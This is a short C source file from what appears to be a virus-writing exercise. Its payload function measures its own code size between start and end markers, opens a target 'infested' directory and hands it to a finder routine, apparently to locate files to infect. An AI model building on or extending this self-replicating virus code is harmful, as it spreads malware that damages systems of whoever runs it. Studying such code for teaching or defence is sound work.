#include "ft_virus.h"

void payload(void)
{
	t_data data;
	int fd;
	char infested_dir[] = INFESTED_DIR;
	#ifdef __HELLO__
		char hello[] = "Hello there\n";

		WRITE(1, hello, sizeof(hello) - 1);
	#endif
	data.infos.pl_size = &payload_end - &payload_start;
	fd = OPEN(infested_dir, O_RDONLY | O_DIRECTORY);
	if (fd < 0)
		payload_end();
	finder(data, fd);
	CLOSE(fd);
	return ;
}
